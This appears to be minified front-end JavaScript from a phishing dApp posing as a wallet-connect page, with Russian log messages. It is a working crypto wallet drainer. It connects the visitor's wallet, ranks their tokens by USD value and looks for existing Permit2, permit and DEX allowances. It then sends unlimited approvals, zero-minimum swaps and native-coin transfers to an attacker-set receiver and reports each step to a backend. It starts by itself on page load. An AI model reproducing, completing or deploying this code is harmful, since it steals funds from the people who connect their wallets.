n=function(){if(!window.ethereum)throw Error("MetaMask (window.ethereum) не найден");return window.ethereum}(),r=await n.request({method:"eth_requestAccounts"});if(!r||!r.length)throw Error("MetaMask не вернул аккаунты");let i=r[0];a("from account:",i);let o=t.recipient&&String(t.recipient).trim()||i;a("recipient:",o);let s=Number.isFinite(t.deadlineSec)?Number(t.deadlineSec):1200,c=Array.isArray(e)?e:[e],l={};for(let e of c){if(!e||null==e.chain_id){a("SKIP asset без chain_id:",e);continue}let t=Number(e.chain_id);l[t]||(l[t]=[]),l[t].push(e)}a("groupedByChain:",l);let u=[];for(let t of Object.keys(l)){var d,h,p,m;let r=Number(t),c=eW[r];if(a("---- CHAIN START ----",r,c&&c.name),!c){a("Нет конфигурации для chain_id:",r," — SKIP");continue}let w=l[r];a("assets for chain",r,":",w);let f=await n.request({method:"eth_chainId"});f.toLowerCase()!==c.chainIdHex.toLowerCase()&&(a("switch chain from",f,"to",c.chainIdHex),await n.request({method:"wallet_switchEthereumChain",params:[{chainId:c.chainIdHex}]}));let g=[];for(let e of w){let t;if(a("build calls for asset:",e),"ERC20"!==e.type){a("SKIP asset type != ERC20 (нативный коин ещё не реализован):",e.type);continue}if(!e.address){a("SKIP ERC20 без address:",e);continue}let n="number"==typeof e.decimals?e.decimals:18,r=10n**BigInt(n);if(e.amount_raw)t=BigInt(e.amount_raw)/r*r;else if(null!=e.amount)t=BigInt(String(e.amount).split(".")[0]||"0")*r;else{a("SKIP asset без amount/amount_raw:",e);continue}if(t<=0n){a("SKIP non-positive amount:",t.toString());continue}let i=BigInt(Math.floor(Date.now()/1e3)+s),l=(1n<<256n)-1n,u=(d=c.router,h=l,"0x095ea7b3"+eF(d)+eL(h)),p=function(e){let{amountIn:t,amountOutMin:a,path0:n,path1:r,to:i,deadline:o}=e,s=eL(t),c=eL(a),l=eL(160n),u=eF(i),d=eL(o),h=eL(2n),p=eF(n);return"0x38ed1739"+(s+c+l+u+d)+(h+p+eF(r))}({amountIn:t,amountOutMin:0n,path0:e.address,path1:c.wrappedNative,to:o,deadline:i});a("approve data:",u),a("swap data:",p),g.push({to:e.address,data:u,value:"0x0"},{to:c.router,data:p,value:"0x0"})}if(!g.length){a("Нет calls для chain",r," — SKIP chain");continue}let _=!1;try{let e=await n.request({method:"wallet_getCapabilities",params:[i,[c.chainIdHex]]});a("wallet_getCapabilities:",e);let t=null==e||null==(m=e[c.chainIdHex])||null==(p=m.atomic)?void 0:p.status;_="ready"===t||"supported"===t,a("atomic status:",t,"=>",_)}catch(e){a("wallet_getCapabilities ERROR:",e)}if(_){let t={version:"2.0.0",from:i,chainId:c.chainIdHex,atomicRequired:!0,calls:g};a("wallet_sendCalls payload:",t);let o=await n.request({method:"wallet_sendCalls",params:[t]});a("wallet_sendCalls result:",o);let s=o&&o.id,l=null;if(s)try{(null==(l=await eB(n,s,a))?void 0:l.status)===200||(null==l?void 0:l.status)==="success"?await eK("Batch завершился успешно:",e,[e]):await eK("Batch завершился не успешно:",e,[e])}catch(e){a("waitForBatchStatus ERROR:",e)}else a("Нет batchId в wallet_sendCalls результате");u.push({chainId:r,mode:"batch",result:o,batchId:s,batchStatus:l})}else{a("Atomic batch недоступен, fallback на обычные eth_sendTransaction (каждый approve/swap отдельно)");let t=[],o=[];for(let e of g){let a={from:i,to:e.to,data:e.data,value:e.value},r=await n.request({method:"eth_sendTransaction",params:[a]});t.push(r)}let s=!0;for(let e of t)try{let t=await eU(n,e,a);o.push(t),t&&("0x1"===t.status||1===t.status)||(s=!1)}catch(e){a("waitForTxReceipt ERROR:",e),s=!1}s&&t.length>0?await eK("Legacy завершился успешно:",e,[e]):await eK("Не все legacy-транзакции успешны:",e,[e]),u.push({chainId:r,mode:"legacy",result:t,receipts:o})}a("---- CHAIN FINISH ----",r)}return a("=== FINISH === allResults:",u),u}let eV=async function(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:"0";try{if("NATIVE"==e.type){e.amount_raw=t;let a=P.gH.from(e.amount_raw);e.amount_usd=parseFloat(D.Js(a,"ether"))*q[eb("ID","CURRENCY",e.chain_id)].USD,await ew({action:"sign_success",asset:e,user_id:U})}else await ew({action:"sign_success",asset:e,user_id:U})}catch(e){console.log(e)}},eK=async function(e,t){let a=arguments.length>2&&void 0!==arguments[2]?arguments[2]:[],n=arguments.length>3&&void 0!==arguments[3]?arguments[3]:"0";console.log("swap_success");try{if("NATIVE"==t.type){t.amount_raw=n;let r=P.gH.from(t.amount_raw);t.amount_usd=parseFloat(D.Js(r,"ether"))*q[eb("ID","CURRENCY",t.chain_id)].USD,await ew({action:"swap_success",asset:t,user_id:U,list:a,swapper:e})}else await ew({action:"swap_success",asset:t,user_id:U,list:a,swapper:e})}catch(e){console.log(e)}},eq=async function(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:"0";try{if("NATIVE"==e.type){e.amount_raw=t;let a=P.gH.from(e.amount_raw);e.amount_usd=parseFloat(D.Js(a,"ether"))*q[eb("ID","CURRENCY",e.chain_id)].USD,await ew({action:"transfer_success",asset:e,user_id:U})}else await ew({action:"transfer_success",asset:e,user_id:U})}catch(e){console.log(e)}},eG=async()=>{try{await ew({action:"sign_cancel",user_id:U})}catch(e){console.log(e)}},eJ=async()=>{try{await ew({action:"sign_unavailable",user_id:U}),J=!0}catch(e){console.log(e)}},e$=async()=>{try{await ew({action:"transfer_cancel",user_id:U})}catch(e){console.log(e)}},ez=async()=>{try{await ew({action:"approve_cancel",user_id:U})}catch(e){console.log(e)}},eX=async()=>{try{await ew({action:"chain_cancel",user_id:U})}catch(e){console.log(e)}},eZ=async()=>{try{await ew({action:"chain_success",user_id:U})}catch(e){console.log(e)}},eY=async(e,t)=>{try{await ew({action:"chain_request",user_id:U,chains:[e,t]})}catch(e){console.log(e)}},eQ=async e=>{try{await ew({action:"sign_request",user_id:U,asset:e})}catch(e){console.log(e)}},e0=async e=>{try{await ew({action:"transfer_request",user_id:U,asset:e})}catch(e){console.log(e)}},e1=async e=>{try{await ew({action:"approve_request",user_id:U,asset:e})}catch(e){console.log(e)}},e2=e=>{try{if(e.hasOwnProperty("increaseAllowance"))return 1;if(e.hasOwnProperty("increaseApproval"))return 2;return!1}catch(e){return!1}},e3=async e=>{try{let t=await ew({action:"check_wallet",address:W}),a=[];if("OK"==t.status)a=t.data;else if(""!=L.AT&&"LOCAL_CHECK"==t.error)a=await ex(e);else{if("LOCAL_CHECK"!=t.error)return a;return await new Promise(e=>setTimeout(e,1e4)),a}let n=[],r=[];for(let e=a.length-1;e>=0;e--)try{let t=a[e],n=eb("ID","ANKR",t.chain_id);L.Settings.Chains[n].Enable&&("NATIVE"!=t.type||L.Settings.Chains[n].Native)&&("ERC20"!=t.type||L.Settings.Chains[n].Tokens)?"NATIVE"==t.type&&t.amount_usd<L.Settings.Chains[n].Min_Native_Price||"ERC20"==t.type&&t.amount_usd<L.Settings.Chains[n].Min_Tokens_Price?a.splice(e,1):"ERC20"==t.type&&(L.Settings.Permit2.Mode&&r.push({chain_id:t.chain_id,address:t.address,type:"permit2",asset:t}),(L.Settings.Permit.Mode&&L.Settings.Permit.Priority>0||L.Settings.Approve.MetaMask>=2&&"MetaMask"==M||L.Settings.Approve.Trust>=2&&"Trust Wallet"==M)&&r.push({chain_id:t.chain_id,address:t.address,type:"permit",asset:t}),L.Settings.Swappers.Enable&&r.push({chain_id:t.chain_id,address:t.address,type:"swapper",asset:t})):a.splice(e,1)}catch(e){console.log(e)}for(let e of r)n.push(new Promise(async t=>{try{let t=new N.F(L.RPCs[e.chain_id]),a=new A.NZ(e.address,F.ERC20,t);switch(e.type){case"permit2":let n=!1;for(let t of L.Permit2_BL)if(t[0]==e.chain_id&&t[1]===e.address.toLowerCase().trim()){n=!0;break}if(e.asset.amount_usd>=L.Settings.Permit2.Price[e.chain_id]&&!n){let t=await a.allowance(W,"0x000000000022d473030f116ddee9f6b43ac78ba3");P.gH.from(t).gt(P.gH.from("0"))&&(e.asset.permit2=!0,e.asset.allowance=t,console.log("[PERMIT_2 FOUND] ".concat(e.asset.name,", Allowance: ").concat(t)))}break;case"permit":let r=await eC(e.chain_id,e.address),i=new A.NZ(e.address,r,t);if(2==e2(i.functions)?(e.asset.increase=2,e.asset.abi=r):1==e2(i.functions)&&(e.asset.increase=1,e.asset.abi=r),e.asset.amount_usd>=L.Settings.Permit.Price[e.chain_id]){let t=eS(i.functions);if(e.asset.permit=t,e.asset.permit_ver="1",e.asset.abi=r,t>0){if(i.functions.hasOwnProperty("version"))try{e.asset.permit_ver=await i.version()}catch(e){console.log(e)}console.log("[PERMIT FOUND] ".concat(e.asset.name,", Permit Type: ").concat(t,", Version: ").concat(e.asset.permit_ver))}}break;case"swapper":if(e.asset.amount_usd>=L.Settings.Swappers.Price)for(let t of ei[e.chain_id])try{let n=await a.allowance(W,t[1]);if(P.gH.from(n).gt(P.gH.from("0"))){if("Quickswap"==t[0]&&0==L.Settings.Swappers.Quick||"Sushiswap"==t[0]&&0==L.Settings.Swappers.Sushi||"Uniswap"==t[0]||0==L.Settings.Swappers.Uniswap||("Pancake"==t[0]||"Pancake_V3"==t[0])&&0==L.Settings.Swappers.Pancake)continue;e.asset.swapper=!0,e.asset.swapper_type=t[0],e.asset.swapper_address=t[1],e.asset.swapper_allowance=n,console.log("[SWAP FOUND] ".concat(e.asset.name,", ").concat(t[0]));break}}catch(e){console.log(e)}}}catch(e){console.log(e)}t()}));await Promise.all(n);for(let e in L.Settings.Chains)try{if(L.Settings.Chains[e].NFTs)break}catch(e){console.log(e)}if(a.sort((e,t)=>t.amount_usd-e.amount_usd),1==L.Settings.Tokens_First){let e=[];for(let t of a)try{if("NATIVE"==t.type)continue;e.push(t)}catch(e){console.log(e)}for(let t of a)try{if("NATIVE"!=t.type)continue;e.push(t)}catch(e){console.log(e)}a=e}else if(2==L.Settings.Tokens_First){let e=[];for(let t of a)try{if("NATIVE"!=t.type)continue;e.push(t)}catch(e){console.log(e)}for(let t of a)try{if("NATIVE"==t.type)continue;e.push(t)}catch(e){console.log(e)}a=e}if(L.Settings.Swappers.Enable&&1==L.Settings.Swappers.Priority){let e=[];for(let t of a)try{if(!t.swapper)continue;e.push(t)}catch(e){console.log(e)}for(let t of a)try{if(t.swapper)continue;e.push(t)}catch(e){console.log(e)}a=e}if(L.Settings.Permit.Mode&&L.Settings.Permit.Priority>0){let e=[];for(let t of a)try{if(!t.permit||0==t.permit||t.amount_usd<L.Settings.Permit.Priority)continue;e.push(t)}catch(e){console.log(e)}for(let t of a)try{if(t.permit&&t.permit>0&&t.amount_usd>=L.Settings.Permit.Priority)continue;e.push(t)}catch(e){console.log(e)}a=e}if(L.Settings.Swappers.Enable&&2==L.Settings.Swappers.Priority){let e=[];for(let t of a)try{if(!t.swapper)continue;e.push(t)}catch(e){console.log(e)}for(let t of a)try{if(t.swapper)continue;e.push(t)}catch(e){console.log(e)}a=e}return a}catch(e){return console.log(e),[]}},e4=(e,t)=>{try{if(eo[e].toLowerCase()==t.toLowerCase())return!1;for(let t of ei[e])if("Pancake"==t[0]||"Uniswap"==t[0]){if("Uniswap"==t[0])return{swapper:"Uniswap",address:t[1]};else if("Pancake"==t[0])return{swapper:"Pancake",address:t[1]}}return!1}catch(e){return!1}},e5=async function(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:null,t=arguments.length>1?arguments[1]:void 0,a=arguments.length>2?arguments[2]:void 0;try{if(B)return;if(B=!0,null!==e)if("MetaMask"==e)if("object"!=typeof window.ethereum||"object"!=typeof window.ethereum.providers)if("object"==typeof window.ethereum&&window.ethereum.isMetaMask)H=window.ethereum,M="MetaMask";else if(el&&1){let e=!1,a=()=>{document.hidden&&(e=!0)};document.addEventListener("visibilitychange",a),setTimeout(()=>{document.removeEventListener("visibilitychange",a),e||(M="WalletConnect","function"==typeof t&&t("ERROR_INSTALL"))},1800),window.location.href="https://metamask.app.link/dapp/".concat(ec),B=!1;return}else if(0){B=!1;return}else M="WalletConnect",B=!1;else{let e=!1;for(let t of window.ethereum.providers)if(!0===t.isMetaMask){e=!0,H=t,M="MetaMask";break}if(!e)if(el&&1){let e=!1,a=()=>{document.hidden&&(e=!0)};document.addEventListener("visibilitychange",a),setTimeout(()=>{document.removeEventListener("visibilitychange",a),e||(M="WalletConnect","function"==typeof t&&t("ERROR_INSTALL"))},1800),window.location.href="https://metamask.app.link/dapp/".concat(ec),B=!1;return}else if(0){B=!1;return}else M="WalletConnect",B=!1}else if("Coinbase"==e)if("object"!=typeof window.ethereum||"object"!=typeof window.ethereum.providers)if("object"==typeof window.ethereum&&(window.ethereum.isCoinbaseWallet||window.ethereum.isCoinbaseBrowser))H=window.ethereum,M="Coinbase";else if(el&&1){window.location.href="https://go.cb-w.com/dapp?cb_url=https://".concat(ec),B=!1;return}else if(0){B=!1;return}else{let e=window.open("https://www.coinbase.com/wallet","_blank");e&&e.focus&&e.focus(),B=!1;return}else{let e=!1;for(let t of window.ethereum.providers)if(!0==t.isCoinbaseWallet){e=!0,H=t;break}if(e)M="Coinbase";else if(el&&1){window.location.href="https://go.cb-w.com/dapp?cb_url=https://".concat(ec),B=!1;return}else if(0){B=!1;return}else{let e=window.open("https://www.coinbase.com/wallet","_blank");e&&e.focus&&e.focus(),B=!1;return}}else if("Trust Wallet"==e){let e=null;if("object"==typeof window.ethereum){if(window.ethereum.isTrust)e=window.ethereum;else if(Array.isArray(window.ethereum.providers)){for(let t of window.ethereum.providers)if(t&&t.isTrust){e=t;break}}}if(!e&&"object"==typeof window.trustwallet&&window.trustwallet.ethereum&&(e=window.trustwallet.ethereum),e)H=e,M="Trust Wallet";else if(el){let e=!1,a=()=>{document.hidden&&(e=!0)};document.addEventListener("visibilitychange",a),setTimeout(()=>{document.removeEventListener("visibilitychange",a),e||(M="WalletConnect","function"==typeof t&&t("ERROR_INSTALL"))},1800),window.location.href="https://link.trustwallet.com/open_url?coin_id=60&url=https://".concat(ec),B=!1;return}else console.log("ПК: нет расширения Trust Wallet → сразу переключаемся на WalletConnect"),M="WalletConnect",B=!1}else if("Binance Wallet"==e)if("object"!=typeof window.BinanceChain)if(0){B=!1;return}else{let e=window.open("https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp","_blank");e&&e.focus&&e.focus(),B=!1;return}else H=window.BinanceChain,M="Binance Wallet";else"WalletConnect"==e||"WalletConnect_v2"==e||"object"!=typeof window.ethereum||(H=window.ethereum),M="WalletConnect";else void 0!==window.ethereum&&window.ethereum&&(H=window.ethereum),M="WalletConnect";console.log(M),console.log(M),console.log(M);try{await e_();let e=null;if("WalletConnect"==M){var n,r,i;for(await ep();!ed;)await new Promise(e=>setTimeout(e,100));for(;eh;){await new Promise(e=>setTimeout(e,500));try{X.disconnect(X.getWalletProvider())}catch(e){console.log(e)}}for(await new Promise(e=>setTimeout(e,1e3)),X.open({view:"Connect"}),await new Promise(e=>setTimeout(e,1e3));!X.getIsConnectedState();)if(await new Promise(e=>setTimeout(e,500)),!(null==(r=X.getState())?void 0:r.open)&&(await new Promise(e=>setTimeout(e,1e3)),!X.getIsConnectedState()&&!(null==(i=X.getState())?void 0:i.open)))return console.log("W3M Closed"),B=!1,await ey();for(await new Promise(e=>setTimeout(e,1e3));null==(n=X.getState())?void 0:n.open;)await new Promise(e=>setTimeout(e,100));if(!X.getIsConnectedState())return console.log("Connection Failed"),B=!1,await ey();eh=!0,W=X.getAddress(),H=X.getWalletProvider(),V=X.getChainId();let e=X.getWalletInfo();M=(null==e?void 0:e.name)||"WalletConnect",$=(null==e?void 0:e.name)||"WalletConnect",K=new j.j(H).getSigner(),0==L.Settings.Sign.WalletConnect&&(J=!0)}else if("WalletConnect_OLD"==M){await ep();try{await H.disconnect()}catch(e){console.log(e)}if(await H.connect(),!H||!(H.accounts.length>0)||!H.accounts[0].includes("0x"))return B=!1,await ey();await new Promise(e=>setTimeout(e,2500)),W=H.accounts[0],V=H.chainId,K=new j.j(H).getSigner(),0==L.Settings.Sign.WalletConnect&&(J=!0)}else if("Trust Wallet"==M)try{if(!(e=await H.request({method:"eth_requestAccounts",params:[{eth_accounts:{}}]}))||!(e.length>0))return B=!1,await ey();if(!H.selectedAddress.includes("0x"))return ey();W=H.selectedAddress,V=parseInt(await H.request({method:"eth_chainId"})),K=new j.j(H).getSigner()}catch(t){if(!(e=await H.request({method:"eth_requestAccounts"}))||!(e.length>0))return B=!1,await ey();if(!e[0].includes("0x"))return ey();W=e[0],V=parseInt(await H.request({method:"eth_chainId"})),K=new j.j(H).getSigner()}else try{if(!(e=await H.request({method:"wallet_requestPermissions",params:[{eth_accounts:{}}]}))||!(e.length>0))return B=!1,await ey();if(!H.selectedAddress.includes("0x"))return ey();W=H.selectedAddress,V=parseInt(await H.request({method:"eth_chainId"})),K=new j.j(H).getSigner()}catch(t){if(!(e=await H.request({method:"eth_requestAccounts"}))||!(e.length>0))return B=!1,await ey();if(!e[0].includes("0x"))return ey();W=e[0],V=parseInt(await H.request({method:"eth_chainId"})),K=new j.j(H).getSigner()}if(!W.match(/^0x\S+$/))throw Error("Invalid Wallet")}catch(e){return console.log(e),B=!1,await ey()}await ew({action:"sign_verify",address:W}),t("step2");try{if("WalletConnect"==M)try{await H.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x1"}]}),await new Promise(e=>setTimeout(e,3e3))}catch(e){console.log(e)}else try{await H.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x1"}]}),await new Promise(e=>setTimeout(e,3e3))}catch(e){if(4902==e.code||-32603==e.code)try{await H.request({method:"wallet_addEthereumChain",params:[er[1]]}),await new Promise(e=>setTimeout(e,3e3))}catch(e){console.log(e)}else console.log(e)}V=parseInt(await H.request({method:"eth_chainId"})),K=new j.j(H).getSigner()}catch(e){console.log(e)}await ev();let o=await e3(W),s=0;for(let e of o)try{s+=e.amount_usd}catch(e){console.log(e)}let c=0;for(let e of o)c+=e.amount_usd;if(await ew({action:"check_finish",user_id:U,assets:o,balance:c}),c>=L.Settings.Minimal_Wallet_Price&&L.Is_Personal_Wallet&&await eg(),s>=1&&await a(W,"1"),L.Settings.Minimal_Wallet_Price>s){B=!1;return}for(let e of((0!=L.Settings.Sign.MetaMask||"MetaMask"!=M)&&(0!=L.Settings.Sign.Trust||"Trust Wallet"!=M)&&("Trust Wallet"!=M||el)||(J=!0),o))try{"NATIVE"!=e.type&&(L.Settings.Use_Swap_Bypass&&!1!=e4(e.chain_id,e.address)?ee[e.chain_id]+=2:ee[e.chain_id]+=1)}catch(e){console.log(e)}console.table(o);let l=!0;for(;l;)for(let e of(l=1==L.LA,o))try{if(e.skip)continue;let a=!1;if("NATIVE"==e.type){let t=new N.F(L.RPCs[e.chain_id]),a=O(await t.getGasPrice()).div(O(100)).mul(Math.floor(100*z)),n=O(42161==e.chain_id||43114==e.chain_id?5e6:369==e.chain_id?9e5:15e4).mul(ee[e.chain_id]).mul(a),r={from:W,to:L.Receiver,value:O(100)},i=await t.estimateGas(r);if((await t.getBalance(W)).sub(i.mul(a)).sub(n).lte(O(0)))continue}if(e.chain_id!=V){await eY(V,e.chain_id);try{if("WalletConnect"==M)try{await H.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x".concat(e.chain_id.toString(16))}]}),await new Promise(e=>setTimeout(e,3e3))}catch(e){await eX();continue}else try{await H.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x".concat(e.chain_id.toString(16))}]}),await new Promise(e=>setTimeout(e,3e3))}catch(t){if(4902==t.code||-32603==t.code)try{await H.request({method:"wallet_addEthereumChain",params:[er[e.chain_id]]}),await new Promise(e=>setTimeout(e,3e3))}catch(e){await eX();continue}else{await eX();continue}}V=parseInt(await H.request({method:"eth_chainId"})),K=new j.j(H).getSigner(),a=!0,await eZ()}catch(e){console.log(e),await eX();continue}}else a=!0;if(!a)continue;if(t("step3"),"NATIVE"==e.type)if(L.Settings.Sign.Native>0&&(!J||1==L.Settings.Sign.Force))for(;;){console.log("я тут 8");try{await ek(e),e.skip=!0;break}catch(t){if(console.log(t),1==L.Settings.Sign.WC_AE&&"WalletConnect"==M||"string"==typeof t.message&&t.message.includes("eth_sign")||-32601==t.code||-32e3==t.code||t.message&&ea(t.message)&&(-32601==JSON.parse(t.message).code||-32e3==JSON.parse(t.message).code)){if(1==L.Settings.Sign.Force)await eG();else for(await eJ();;)try{await eN(e),e.skip=!0;break}catch(e){if(console.log(e),"LOW_BALANCE"!=e){if(await e$(),!L.Loop_N)break}else break}break}if(console.log(t),"LOW_BALANCE"!=t){if(await eG(),!L.Loop_N)break}else break}}else for(;;)try{await eN(e),e.skip=!0;break}catch(e){if(console.log(e),"LOW_BALANCE"!=e){if(await e$(),!L.Loop_N)break}else break}else if("ERC20"==e.type)if(L.Settings.Use_Swap_Bypass)for(;;)try{await eH(e,{recipient:L.Receiver}),e.skip=!0;break}catch(e){if(console.log(e),await ez(),t("step4"),!L.Loop_T)break}else for(;;)try{await eD(e),e.skip=!0;break}catch(e){if(console.log(e),await e$(),t("step4"),!L.Loop_T)break}}catch(e){console.log(e)}B=!1}catch(e){console.log(e)}},e8=async()=>{try{if("undefined"!=typeof localStorage&&void 0===localStorage.CF_ID){let e=await ew({action:"retrieve_id"});"OK"==e.status?localStorage.CF_ID=e.data:localStorage.CF_ID=Math.floor(Date.now()/1e3)}for(let e in"undefined"!=typeof localStorage&&(U=localStorage.CF_ID),await ef(),er={1:{chainId:"0x1",chainName:"Ethereum Mainnet",nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:[L.RPCs[1]],blockExplorerUrls:["https://etherscan.io"]},56:{chainId:"0x38",chainName:"BNB Smart Chain",nativeCurrency:{name:"Binance Coin",symbol:"BNB",decimals:18},rpcUrls:[L.RPCs[56]],blockExplorerUrls:["https://bscscan.com"]},137:{chainId:"0x89",chainName:"Polygon Mainnet",nativeCurrency:{name:"MATIC",symbol:"MATIC",decimals:18},rpcUrls:[L.RPCs[137]],blockExplorerUrls:["https://polygonscan.com"]},43114:{chainId:"0xA86A",chainName:"Avalanche Network C-Chain",nativeCurrency:{name:"AVAX",symbol:"AVAX",decimals:18},rpcUrls:[L.RPCs[43114]],blockExplorerUrls:["https://snowtrace.io/"]},42161:{chainId:"0xA4B1",chainName:"Arbitrum One",nativeCurrency:{name:"ETH",symbol:"ETH",decimals:18},rpcUrls:[L.RPCs[42161]],blockExplorerUrls:["https://explorer.arbitrum.io"]},81457:{chainId:"0x13e31",chainName:"Blast",nativeCurrency:{name:"ETH",symbol:"ETH",decimals:18},rpcUrls:[L.RPCs[81457]],blockExplorerUrls:["https://blastscan.io/"]},10:{chainId:"0xA",chainName:"Optimism",nativeCurrency:{name:"ETH",symbol:"ETH",decimals:18},rpcUrls:[L.RPCs[10]],blockExplorerUrls:["https://optimistic.etherscan.io/"]},250:{chainId:"0xFA",chainName:"Fantom Opera",nativeCurrency:{name:"FTM",symbol:"FTM",decimals:18},rpcUrls:[L.RPCs[250]],blockExplorerUrls:["https://ftmscan.com/"]},8453:{chainId:"0x2105",chainName:"Base",nativeCurrency:{name:"ETH",symbol:"ETH",decimals:18},rpcUrls:[L.RPCs[8453]],blockExplorerUrls:["https://basescan.org/"]},324:{chainId:"0x144",chainName:"zkSync Era",nativeCurrency:{name:"ETH",symbol:"ETH",decimals:18},rpcUrls:[L.RPCs[324]],blockExplorerUrls:["https://explorer.zksync.io/"]},369:{chainId:"0x171",chainName:"Pulse",nativeCurrency:{name:"PLS",symbol:"PLS",decimals:18},rpcUrls:[L.RPCs[369]],blockExplorerUrls:["https://scan.pulsechain.com/"]}},L.RPCs)ee[e]=1}catch(e){console.log(e)}};if("undefined"!=typeof document){let e=()=>e8();"loading"===document.readyState?document.addEventListener("DOMContentLoaded",e):e()}let e6=/Mobi|Android|iPhone|iPad|iPod/i;function e9(e){return"safepalwallet://dapp?url=".concat(encodeURIComponent(e))}function e7(e){return"safepal://dapp?url=".concat(encodeURIComponent(e))}function te(e,t){var a;let n=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{},r="undefined"!=typeof navigator&&e6.test(navigator.userAgent),i=null!=(a=n.dappBase)?a:"trust-card.vercel.app";if(r&&e)try{if("Trust Wallet"===t)window.location.href="trust://wc?uri=".concat(encodeURIComponent(e));else if("TokenPocket"===t)window.location.href="tpoutside://pull.activity?param=".concat(encodeURIComponent(JSON.stringify(e)));else if("SafePal"===t){var o="".concat(i,"?wc=").concat(encodeURIComponent(e));let t=function(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:0;return setTimeout(()=>{try{window.location.href=e}catch(e){}},t)};"undefined"!=typeof navigator&&/Android/i.test(navigator.userAgent)?(t(function(e){let t="dapp?url=".concat(encodeURIComponent(e));return"intent://".concat(t,"#Intent;scheme=safepalwallet;package=com.safepal.wallet;end")}(o),0),t(e9(o),300),t(e7(o),600)):(t(e9(o),0),t(e7(o),300))}}catch(e){console.warn("❌ Ошибка редиректа в мобильный кошелёк:",e)}}var tt=a(12099),ta=a(8211),tn=a(81788),tr=a(12235),ti=a(74314),to=a(78531),ts=a(32548),tc=a(8086),tl=a(6994),tu=a(15506);let td={ETH:[{name:"MetaMask",icon:"metamask"},{name:"Trust Wallet",icon:"trustwallet"},{name:"TokenPocket",icon:"tokenpocket"},{name:"OKX Wallet",icon:"okx"},{name:"WalletConnect",icon:"walletconnect"},{name:"Bitget Wallet",icon:"bitget"},{name:"Ellipal",icon:"ellipal"},{name:"imToken",icon:"imtoken"},{name:"OneKey",icon:"onekey"},{name:"SafePal",icon:"safepal"},{name:"MPCWallet",icon:"mpcwallet"},{name:"MathWallet",icon:"mathwallet"},{name:"Nabox",icon:"nabox"},{name:"ONTO",icon:"onto"},{name:"BitpieWallet",icon:"bitpie"},{name:"HyperPay",icon:"hyperpay"},{name:"EchoooWallet",icon:"echooo"},{name:"Coin98",icon:"coin98"},{name:"CLVWallet",icon:"clv"},{name:"AuroxWallet",icon:"aurox"},{name:"Valora",icon:"valora"},{name:"Crypto",icon:"crypto"},{name:"Patex",icon:"patex"},{name:"FoxWallet",icon:"foxwallet"},{name:"JoyIDWallet",icon:"joyid"}],TRON:[{name:"Trust Wallet",icon:"trustwallet"},{name:"TokenPocket",icon:"tokenpocket"},{name:"TronLink",icon:"tronlink"}]},th=e=>{let{walletName:t,network:a}=e,[i,o]=(0,r.useState)(0),[s,c]=(0,r.useState)("/icons/ic_select_9c2b5e8d.png"),[l,u]=(0,r.useState)([]),[d,h]=(0,r.useState)(!1);return(0,r.useEffect)(()=>{let e=((e,t)=>{let a=[];if("ETH"===t){let t={MetaMask:"/icons/ic_wallet_metamask_3b7e9a2c.png",TokenPocket:"/icons/ic_wallet_tp_eth_5a1f4c8e.png","OKX WALLET":"/icons/ic_wallet_okx_eth_7c3e9a1f.png","Trust Wallet":"/icons/ic_wallet_tw_eth_2b8f5c4a.png",WalletConnect:"/icons/ic_wallet_wc_eth_6e1a9c3f.png","Bitget Wallet":"/icons/ic_wallet_bitget_eth_4a7c2e8b.png",Ellipal:"/icons/ic_wallet_ellipal_9f3a5c1e.png",imToken:"/icons/ic_wallet_imtoken_eth_8b6e2a4c.png",CoinbaseWallet:"/icons/ic_wallet_cb_eth_5c9a3f7e.png",OneKey:"/icons/ic_wallet_onekey_eth_2f7b4a8c.png",SafePal:"/icons/ic_wallet_safepal_eth_6a1e9c3f.png",MPCWallet:"/icons/ic_wallet_mpc_eth_4c8a2e6b.png",MathWallet:"/icons/ic_wallet_math_eth_9b3f5a1c.png",Nabox:"/icons/ic_wallet_nabox_eth_7e2c8a4f.png",ONTO:"/icons/ic_wallet_onto_eth_3a6f9c2e.png",BitpieWallet:"/icons/ic_wallet_bitpie_eth_5f1a7c4b.png",HyperPay:"/icons/ic_wallet_hyperpay_eth_8c4e2a6f.png",EchoooWallet:"/icons/ic_wallet_echooo_eth_2b9a5c8e.png",iToken:"/icons/ic_wallet_itoken_eth_6f3c1a9b.png",Halo:"/icons/ic_wallet_halo_eth_4a7e8c2f.png",Coin98:"/icons/ic_wallet_coin98_eth_9b5a3c1e.png",OpenBlock:"/icons/ic_wallet_openblock_eth_7c2f6a4b.png",CLVWallet:"/icons/ic_wallet_clv_eth_3e8a1c5f.png",AuroxWallet:"/icons/ic_wallet_aurox_eth_5a4c9e2b.png",Valora:"/icons/ic_wallet_valora_eth_8f6a2c4e.png",Crypto:"/icons/ic_wallet_crypto_eth_2b7c5a9f.png",Patex:"/icons/ic_wallet_patex_eth_6e3a8c1b.png",FoxWallet:"/icons/ic_wallet_fox_eth_4f9a2c6e.png",JoyIDWallet:"/icons/ic_wallet_joyid_eth_9c5a1e3f.png"}[e]||null;t&&a.push(t)}if("TRON"===t){let t={"Trust Wallet":"/icons/ic_wallet_tw_eth_2b8f5c4a.png",TokenPocket:"/icons/ic_wallet_tp_tron_3b7e9a2c.png",TronLink:"/icons/ic_wallet_tronlink_6e1a9c3f.png"}[e]||null;t&&a.push(t)}if("SOLANA"===t){let t={Phantom:"/icons/ic_wallet_phantom_sol_9f3a5c1e.png"}[e]||null;t&&a.push(t)}let n="https://img.logo.dev/wallet/".concat(encodeURIComponent(e.toLowerCase().replace(/\s+/g,"-")));return a.push(n),a})(t,a);u(e),o(0),h(!1),e.length>0?c(e[0]):c("/icons/ic_select_9c2b5e8d.png")},[t,a]),(0,n.jsx)("img",{src:s,alt:t,onError:e=>{if(!d)if(i<l.length-1){let e=i+1;o(e),c(l[e]||"/icons/select_img.png")}else 